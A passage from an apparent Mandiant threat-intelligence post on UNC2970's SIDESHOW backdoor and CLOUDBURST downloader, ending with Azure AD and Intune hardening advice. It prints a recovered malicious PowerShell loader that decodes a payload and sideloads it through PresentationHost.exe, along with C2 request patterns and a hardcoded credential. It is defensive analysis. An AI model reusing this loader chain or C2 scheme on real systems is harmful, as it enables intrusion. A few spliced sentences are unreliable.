800px","https://storage.googleapis.com/gweb-cloudblog-publish/images/lightshow1-fig20-handle-payload-img.max-800x800.png"],null,3]]],[null,null,[null,[null,"\u003ch3\u003eSIDESHOW\u003c/h3\u003e\n\u003cp\u003eSIDESHOW is a backdoor written in C/C++ that communicates via HTTP POST requests with its C2 server. The backdoor is multi-threaded, uses RC6 encryption, and supports at least 49 commands, which can be seen in Table 1. Capabilities include arbitrary command execution (WMI capable); payload execution via process injection; service, registry, scheduled task, and firewall manipulation; querying and updating Domain Controller settings; creating password protected ZIP files; and more. SIDESHOW does not explicitly establish persistence; however, based on the multitude of supported commands it may be commanded to establish persistence.\u003c/p\u003e\n\u003cp\u003eSIDESHOW derives a system-specific RC6 key using the same registry values as TOUCHMOVE and uses the generated key to decrypt the same configuration file from disk that TOUCHMOVE decrypted. The decrypted configuration file contains a list of C2 URLs to which SIDESHOW communicates using HTTP POST requests. SIDESHOW iterates this C2 URL list and attempts to authenticate to each C2 URL until it is successful. Once successful, SIDESHOW enters a state of command processing and sends additional HTTP POST requests to retrieve commands. SIDESHOW attempts to use the system's default HTTP User-Agent string during C2 communications; however, if not available it uses the hard-coded HTTP User-Agent string:\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) \r\nChrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen communicating to its C2 server via HTTP POST requests, SIDESHOW forms a URI parameter string consisting of a mix of randomly selected and hard-coded URI parameters.\u003c/p\u003e\n\u003cp\u003eAuthentication requests use the following URI parameter string format:\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e1\u0026lt;param_1\u0026gt;\u003d\u0026lt;hex_seed\u0026gt;\u0026amp;\u0026lt;param_2\u0026gt;\u003dpAJ9dk4OVq85jxKWoNfw1AG2C\u0026amp;\u0026lt;param_3\u0026gt;\u003d\r\n\u0026lt;16_random_hex_chars\u0026gt;\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe first URI parameter value comes from SIDESHOW’s configuration and is used to seed the random function.\u003c/p\u003e\n\u003cp\u003eThe second URI parameter value, \u003ccode\u003epAJ9dk4OVq85jxKWoNfw1AG2C\u003c/code\u003e, is hardcoded and likely an authentication credential.\u003c/p\u003e\n\u003cp\u003eThe third URI parameter value, \u003ccode\u003e\u0026lt;16_random_hex_chars\u0026gt;\u003c/code\u003e, is a session identifier (\u003ccode\u003e\u0026lt;session_id\u0026gt;\u003c/code\u003e) used for future communications and consists of two subcomponents:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003e\u0026lt;8_random_hex_based_on_seed\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026lt;8_random_hex_based_on_tickcount\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe first URI parameter's value, \u003ccode\u003e\u0026lt;hex_seed\u0026gt;\u003c/code\u003e, is used as a random seed value to derive the first eight hexadecimal characters (\u003ccode\u003e\u0026lt;8_random_hex_based_on_seed\u0026gt;\u003c/code\u003e), whereas the last eight hexadecimal characters (\u003ccode\u003e\u0026lt;8_random_hex_based_on_tickcount\u0026gt;\u003c/code\u003e) are derived using the CPU's current tick count as the random seed value. This results in the value \u003ccode\u003e\u0026lt;8_random_hex_based_on_seed\u0026gt;\u003c/code\u003e being deterministic, while SIDESHOW\u003c/span\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003ch2\u003eReaching for the Clouds: Intune with CLOUDBURST\u003c/h2\u003e\n\u003cp\u003eIn at least one investigation, Mandiant identified the threat actors leveraging Microsoft Intune, Microsoft's endpoint management solution, to deploy malware to hosts in the environment. Mandiant suspects that this method of malware deployment was used due to the absence of a VPN solution for remote machines. In order to remotely execute code, the attackers leveraged the Microsoft \u003ca href\u003d\"https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eIntune management extension\u003c/a\u003e (IME) to upload custom PowerShell scripts containing malicious code to various hosts in the client environment. While conducting forensic analysis on a host, Mandiant identified the following Microsoft IME related PowerShell script command line arguments:\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -\r\nexecutionPolicy bypass -file \"C:\\Program Files (x86)\\Microsoft Intune Management \r\nExtension\\Policies\\Scripts\\42fb3cca-48dd-4412-a11a-245384544402_f391eded-82d3-4506-8bf4-9213f6f4d586.ps1\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAt the time of analysis, Mandiant was unable to acquire the PS1 file itself, however; Mandiant was able to acquire a full copy of the PS1 file from local Microsoft IME logs identified on a host, located at:\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eC:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\IntuneManagementExtension-\r\nYYYYMMDD-HHMMSS.log\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe entry in the local logs appeared as follows:\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;![LOG[[PowerShell] response payload is [{\u0026quot;AccountId\u0026quot;:\u0026quot;[userGUID]\u0026quot;,\u0026quot;PolicyId\u0026quot;:\u0026quot;f391eded-82d3-4506-8bf4-\r\n9213f6f4d586\u0026quot;,\u0026quot;PolicyType\u0026quot;:1,\u0026quot;DocumentSchemaVersion\u0026quot;:\u0026quot;1.0\u0026quot;,\u0026quot;PolicyHash\u0026quot;:\u0026quot;P23cVfMyHLECSGPt1T6YYcoxhCLWKS05jX5M\r\nukC3MIw\u003d\u0026quot;,\u0026quot;PolicyBody\u0026quot;:\u0026quot;$EnModule \u003d \\\u0026quot;[Base64_encoded_CLOUDBURST_payload]\u0026quot;\\r\\n$DeModule \u003d\r\n[System.Convert]::FromBase64CharArray($EnModule, 0, $EnModule.Length)\\r\\nSet-Content\r\n\\\u0026quot;C:\\\\ProgramData\\\\mscoree.dll\\\u0026quot; -Value $DeModule -Encoding Byte\\r\\nCopy-Item\r\n\\\u0026quot;C:\\\\Windows\\\\System32\\\\PresentationHost.exe\\\u0026quot; -Destination \\\u0026quot;C:\\\\ProgramData\\\u0026quot;\\r\\nStart-Process -\r\nNoNewWindow -FilePath \\\u0026quot;C:\\\\ProgramData\\\\PresentationHost.exe\\\u0026quot; -ArgumentList \\\u0026quot;-\r\nembeddingObject\\\u0026quot;\\r\\n\u0026quot;,\u0026quot;PolicyBodySize\u0026quot;:null,\u0026quot;PolicyScriptParameters\u0026quot;:null,\u0026quot;ContentSignature\u0026quot;:\u0026quot;\r\n[Base64_encoded_signing_certificate]\u0026quot;,\u0026quot;isTombStoned\u0026quot;:false,\u0026quot;isRecurring\u0026quot;:false,\u0026quot;isFullSync\u0026quot;:false,\u0026quot;ExecutionContext\u0026quot;:0,\r\n\u0026quot;InternalVersion\u0026quot;:1,\u0026quot;EnforceSignatureCheck\u0026quot;:false,\u0026quot;RunningMode\u0026quot;:1,\u0026quot;RemediationScript\u0026quot;:null,\u0026quot;RunRemediation\u0026quot;:false,\u0026quot;\r\nRemediateScriptHash\u0026quot;:null,\u0026quot;RemediationScriptParameters\u0026quot;:null,\u0026quot;ComplianceRules\u0026quot;:null,\u0026quot;ExecutionFrequency\u0026quot;:0,\u0026quot;\r\nRetryCount\u0026quot;:0,\u0026quot;BlockExecutionNotifications\u0026quot;:false,\u0026quot;ModifiedTime\u0026quot;:null,\u0026quot;Schedule\u0026quot;:null,\u0026quot;IsFirstPartyScript\u0026quot;:false,\u0026quot;TargetType\u0026quot;:0,\r\n\u0026quot;ScriptApplicabilityStateDueToAssignmentFilters\u0026quot;:null,\u0026quot;AssignmentFilterIdToEvalStateMap\u0026quot;:{},\u0026quot;HardwareConfigurationMetadata\u0026quot;:null}]]LOG]!\u0026gt;\u0026lt;time\u003d\u0026quot;06:59:15.2941778\u0026quot; date\u003d\u0026quot;6-9-2022\u0026quot; component\u003d\u0026quot;IntuneManagementExtension\u0026quot; context\u003d\u0026quot;\u0026quot; type\u003d\u0026quot;1\u0026quot; thread\u003d\u0026quot;5\u0026quot; file\u003d\u0026quot;\u0026quot;\u0026gt;\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe malicious PowerShell script was used to decode the Base64 encoded CLOUDBURST payload and drop it on disk as \u003ccode\u003eC:\\ProgramData\\mscoree.dll\u003c/code\u003e. The script would then write a copy of \u003ccode\u003eC:\\Windows\\System32\\PresentationHost.exe\u003c/code\u003e to \u003ccode\u003eC:\\ProgramData\u003c/code\u003e and execute it with the argument \u003ccode\u003e-embeddingObject\u003c/code\u003e. \u003ccode\u003ePresentationHost.exe\u003c/code\u003e is a legitimate Windows binary used by UNC2970 to sideload CLOUDBURST.\u003c/p\u003e\n\u003cp\u003eUpon execution, \u003ccode\u003ePresentationHost.exe\u003c/code\u003e would load the CLOUDBURST payload into memory. Upon further analysis of the Microsoft IME endpoint logs, Mandiant identified a unique GUID, \u003ccode\u003ef391eded-82d3-4506-8bf4-9213f6f4d586\u003c/code\u003e, in the PolicyID field, which is a \"Unique identifier of the Policy in the data warehouse\". The Intune Data Warehouse provides insight and information about an enterprise mobile environment, such as historical Intune data and Intune data refreshed on a daily occurence. The identified GUID also matched the GUID of the PowerShell script file name and the GUID observed in an IME associated registry key.\u003c/p\u003e\n\u003cp\u003eWhen reviewing the \u003ca href\u003d\"https://endpoint.microsoft.com/#blade/Microsoft_Intune_DeviceSettings/TenantAdminMenu/auditing\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eIntune Tenant admin Audit logs\u003c/a\u003e, Mandiant identified the same GUID under the ObjectID field. The Intune Tenant audit logs shows records of activities that generate a change in Intune, including create, update (edit), delete, assign, and remote actions. The logs revealed that the threat actors used a previously compromised account to perform a create, assign, patch, and finally a delete action of a Device Management Script, using the Target \u003ccode\u003eMicrosoft.Management.Services.Api.DeviceManagementScript\u003c/code\u003e and the GroupID \u003ccode\u003ef391eded-82d3-4506-8bf4-9213f6f4d586\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eFurther analysis revealed that ObjectID GUIDs referenced in the Intune Tenant admin Audit logs maps to the \u003ca href\u003d\"https://endpoint.microsoft.com/#view/Microsoft_AAD_IAM/GroupsManagementMenuBlade/~/AllGroups\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eID of Mobile App assignment groups\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eAt the time of analysis, the GroupID \u003ccode\u003ef391eded-82d3-4506-8bf4-9213f6f4d586\u003c/code\u003e, was no longer present in the Intune Endpoint management admin center, and was likely deleted by the threat actors.\u003c/p\u003e\n\u003cp\u003eIn order to determine malicious usage of Microsoft Intune, Mandiant performed the following analysis steps:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eAnalyzed AzureAD sign-in logs for evidence of suspicious logons to the Microsoft Intune application\r\n\u003cul\u003e\n\u003cli\u003eAnalyzed Microsoft Intune audit logs for evidence of unexpected deployments and performed the following:\r\n\u003cul\u003e\n\u003cli\u003eUtilized the GroupID GUID to search for the presence of the following endpoint artifacts:\r\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\\u003c/code\u003e\u003cem\u003eIntuneManagementExtension\\Policies\\\u0026lt;UserGUID\u0026gt;\\\u0026lt;suspicious ObjectID GUID\u0026gt;\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC:\\Program Files (x86)\\Microsoft Intune Management Extension\\\u003c/code\u003e\u003cem\u003ePolicies\\Scripts\\\u0026lt;UserGUID\u0026gt;_\u0026lt;suspicious ObjectID GUID\u0026gt;.ps1\u003c/em\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eFor hosts that had the aforementioned artifacts, the following was performed:\r\n\u003cul\u003e\n\u003cli\u003eAcquired the PS1 file(s) and analyzed for malicious code\u003c/li\u003e\n\u003cli\u003ePerformed traditional endpoint analysis\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eMandiant tracks the malware being distributed via InTune as CLOUDBURST. CLOUDBURST is a downloader written in C that communicates via HTTP. The malware attempts to make itself look like a legitimate version of \u003ccode\u003emscoree.dll\u003c/code\u003e, but contains fake exports, the same way that TOUCHSHIFT uses fake exports. One variant of CLOUDBURST made use of legitimate open-source software that was added as exports, in addition to the fake exports. The actual export with malicious code is \u003ccode\u003eCorExitProcess\u003c/code\u003e. The \u003ccode\u003eCorExitProcess\u003c/code\u003e\u003cem\u003e \u003c/em\u003eexport expects the single argument \u003cem\u003e-embeddingObject\u003c/em\u003e.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 22: Comparing command line argument with command line argument has been verified, CLOUDBURST builds the domain as a stack string, and sends out the two following requests to the C2 server:\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ehxxps://[c2domain]/wp-content/plugins/contact.php?gametype\u003d\r\n\u0026lt;random_dword\u0026gt;\u0026amp;type\u003dO8Akm8aV09Nw412KMoWJd\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode\u003ehxxps://[c2domain]/wp-content/plugins/contact.php?\r\ngametype\u003dtennis\u0026amp;type\u003dk\u0026lt;random_dword\u0026gt;\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFollowing Although the group has previously targeted defense, media, and technology industries, the targeting of security researchers suggests a shift in strategy or an expansion of its operations. Technical indicators and the group’s TTPs link it to TEMP.Hermit, although this latest activity suggests the group is adapting their capabilities as more of their targets move to cloud services. To learn more about how \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/lightshift-and-lightshow\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eUNC2970 further enabled its operations\u003c/a\u003e, please see part two of our research.\u003c/p\u003e\n\u003ch2\u003eCampaign Tracking\u003c/h2\u003e\n\u003cp\u003eMandiant will continue to monitor UNC2970’s campaigns and intrusion operations and will provide notable and dynamic updates regarding changes in tactics and techniques, the introduction of tools with new capabilities, or the use of new infrastructure to carry out their mission.\u003c/p\u003e\n\u003cp\u003eFor more insights into how Mandiant tracks this and similar campaigns, see our \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/attacker-visibility-threat-campaigns\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eThreat Campaigns\u003c/a\u003e feature within \u003ca href\u003d\"https://cloud.google.com/security/products/threat-intelligence\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eMandiant Advantage Threat Intelligence\u003c/a\u003e.\u003c/p\u003e\n\u003ch2\u003eRecommended Mitigations\u003c/h2\u003e\n\u003ch3\u003eHardening Azure AD and Microsoft Intune\u003c/h3\u003e\n\u003cp\u003eMandiant has observed UNC2970 leverage weak identity controls in Azure AD combined with Microsoft Intune’s endpoint management capabilities to effectively deploy malicious PowerShell scripts onto unsuspecting endpoints.\u003c/p\u003e\n\u003cp\u003eIncreasing Azure AD identity protections and limiting access to Microsoft Intune is essential in mitigating the attacker activity observed by Mandiant. Organizations should consider implementing the following hardening controls:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCloud-Only Accounts:\u003c/strong\u003e Organizations should utilize cloud-only accounts for privileged access within Azure AD (e.g., Global Admins, Intune Administrator) and \u003cu\u003enever\u003c/u\u003e assign privileged access to synced accounts from on-premises identity providers such as Active Directory. Additionally, admins should utilize a separate “daily-driver” account for day-to-day activities such as sending email or web-browsing. Dedicated admin accounts should be utilized to carry out administrative functions \u003cu\u003eonly\u003c/u\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEnforce Strong Multi-Factor Authentication Methods:\u003c/strong\u003e Organizations should consider enforcing enhanced and phishing-resistant Multi-Factor Authentication (MFA) methods for all users and administrators. Weak MFA methods commonly include SMS, Voice (phone call), OTPs, or Push notifications and should be considered for removal. MFA enhancements for non-privileged users should include contextual information regarding the MFA request such as number-matching, application name, and geographic location. For privileged accounts, Mandiant recommends the enforcement of hardware tokens or FIDO2 Security Keys as-well as requiring MFA per each sign-in regardless of location (e.g., Trusted Network, Corporate VPN). As an initial roll out for enhanced MFA methods, organizations should focus on all accounts with administrative privileges in Azure AD. Microsoft has \u003ca href\u003d\"https://learn.microsoft.com/en-us/azure/active-directory/authentication/how-to-mfa-additional-context\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eadditional information regarding contextual MFA settings\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePrivileged Identity Management (PIM) Solution:\u003c/strong\u003e Mandiant recommends that organizations consider utilizing a PIM solution. A PIM solution should include a Just-In-Time (JIT) access capability which will provide access when requested, for a specific duration of time, and should initiate an approval flow, prior to providing an account access to a highly privileged role (e.g., Global Administrator or Intune Administrator).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eConditional Access Policies (CAPs) to Enforce Security Restrictions in Azure AD:\u003c/strong\u003e A CAP allows organizations to set requirements for accessing cloud apps such as Intune, based on various conditions including location and device platform. Mandiant recommends that Organizations utilize CAPs to restrict Azure administrative functions to only compliant and registered devices in Azure AD and only from a specific subset of trusted IPs or ranges. Microsoft has \u003ca href\u003d\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-cloud-apps\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003emore information on leveraging CAPs to access Cloud Apps\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAzure Identity Protection:\u003c/strong\u003e Azure Identity Protection is a security feature within Azure Active Directory that allows organizations to automate the detection and remediation of identity-based risks. Identity Protection analyzes user account activity as-well as sign-in activity to identify potentially compromised accounts or unauthorized authentication requests. Identity Protection data can be leveraged to enhance Conditional Access Policies by enforcing access controls based on user or sign-in risk. Additionally, Identity Protection risk data should be exported to a Security Information and Event Management (SIEM) solution for further correlation and analysis. \u003cstrong\u003eNote:\u003c/strong\u003e Azure Identity Protection requires an Azure AD Premium P2 License.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eMulti Admin Approval with Intune: \u003c/strong\u003eTo prevent unauthorized changes, organizations utilizing Intune should implement the Multi Admin Approval feature. This feature enforces a multiple administrative approval process that requires secondary admin approval before modifying or creating Script and App deployments. \u003cstrong\u003eNote:\u003c/strong\u003e As of February 2023, Multi Admin Approval is in Public Preview and does not yet support request notifications. Requests will need to be manually communicated to expedite the approval workflow. Microsoft has \u003ca href\u003d\"https://learn.microsoft.com/en-us/mem/intune/fundamentals/multi-admin-approval\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003emore information regarding Multi Admin Approval\u003c/a\u003e.\u003c/p\u003e\n\u003ch3\u003eAdditional Security Controls\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eBlock Office Macros: \u003c/strong\u003eWhile Microsoft has changed the default behavior of Office applications to block macros from the internet, Mandiant still recommends Organizations proactively deploy policies to control and enforce the behavior of office files containing macros. Microsoft has \u003ca href\u003d\"https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked#use-policies-to-manage-how-office-handles-macros\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003emore information on using policies to manage how Office handles macros\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eDisable Disk Image Auto-Mount: \u003c/strong\u003eMandiant has observed UNC2970 utilize trojanized ISO files containing malicious payloads to bypass security controls and trick victims into executing malware. On Windows systems, the option to mount an ISO by “\u003cem\u003eright-clicking\u003c/em\u003e” the file then selecting “\u003cem\u003eMount\u003c/em\u003e” from the context menu can be removed by deleting the \u003ca href\u003d\"https://gist.github.com/wdormann/fca29e0dcda8b5c0472e73e10c78c3e7\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eregistry keys\u003c/a\u003e associated with image file types (.iso, .img, .vhd, .vhdx). Deleting these registry keys will also prevent a user from auto-mounting an image file by “\u003cem\u003edouble-clicking” \u003c/em\u003ethe file.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEnhance PowerShell Logging: \u003c/strong\u003eIncrease PowerShell logging to provide security engineers and investigators the visibility needed to detect malicious activity and provide a historical record of how PowerShell was used on systems. For additional details regarding enhancing PowerShell logging, please reference to the Mandiant blog post, “\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/greater-visibility\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eGreater Visibility Through PowerShell Logging\u003c/a\u003e”.\u003c/p\u003e\n\u003ch2\u003eIndicators of Compromise\u003c/h2\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv
